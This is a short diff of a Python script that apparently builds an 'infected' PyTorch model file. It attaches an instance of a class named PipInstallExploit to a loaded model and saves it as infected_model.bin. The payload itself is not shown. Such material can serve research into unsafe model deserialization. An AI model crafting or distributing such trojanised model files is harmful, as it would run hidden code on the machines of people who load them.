@@ -10,10 +10,10 @@ class PipInstallExploit:
 
 def make_infected_model():
     # Load the original model
-    malicious_model = torch.load("diffusion_pytorch_model.bin")
+    malicious_model = torch.load("pytorch_model.bin")
 
     # Add the malicious class to the end of the model
-    malicious_model.exploit = PipInstallExploit()
+    malicious_model["exploit"] = PipInstallExploit()
 
     # Save the malicious model as a new file
     torch.save(malicious_model, "infected_model.bin")
